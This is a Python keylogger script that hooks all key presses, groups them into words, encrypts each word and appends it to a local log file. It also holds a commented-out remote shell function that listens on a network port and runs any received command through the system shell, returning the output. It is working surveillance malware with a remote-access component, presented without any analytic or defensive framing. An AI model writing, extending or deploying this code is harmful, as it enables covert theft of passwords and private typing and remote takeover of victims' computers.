import threading
import keyboard
from cryptography.fernet import Fernet
import socket
import subprocess

logfile = 'keyloggs.txt'
keyfile = 'encryption_key.key'
buffer = []

# Generate and save a key if not already created
def generate_key():
    key = Fernet.generate_key()
    with open(keyfile, 'wb') as key_out:
        key_out.write(key)
    return key

# Load the existing key
def load_key():
    try:
        with open(keyfile, 'rb') as key_in:
            return key_in.read()
    except FileNotFoundError:
        return generate_key()

# Encrypt data
def encrypt(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

# Load or generate encryption key
key = load_key()

def on_key_press(event):
    global buffer
    if event.name == 'space' or event.name == 'enter':
        word = ''.join(buffer)
        buffer.clear()
        if word:
            encrypted_word = encrypt(word, key)
            try:
                with open(logfile, 'ab') as f:
                    f.write(encrypted_word + b'\n')
            except Exception as e:
                print(f"Error writing to log file: {e}")
    elif event.name == 'backspace':
        if buffer:
            buffer.pop()
    elif len(event.name) == 1:
        buffer.append(event.name)

# Commented out reverse_shell function
# def reverse_shell():
#     host = '0.0.0.0'  # Listen on all available interfaces
#     port = 12345  # Replace with the desired port number

#     try:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.bind((host, port))
#         s.listen(1)  # Listen for only one connection

#         print(f"Listening on {host}:{port}")

#         conn, addr = s.accept()  # Accept incoming connection
#         print(f"Connection from {addr}")

#         while True:
#             command = conn.recv(1024).decode()
#             if command.lower() == 'exit':
#                 break
#             output = subprocess.run(command, shell=True, capture_output=True, text=True)
#             conn.sendall(output.stdout.encode() + output.stderr.encode())

#         conn.close()
#         s.close()
        
#     except Exception as e:
#         print(f"Error in reverse shell: {e}")

# Start the reverse shell in a new thread
# threading.Thread(target=reverse_shell).start()

# Start the keylogger
keyboard.on_press(on_key_press)
keyboard.wait()

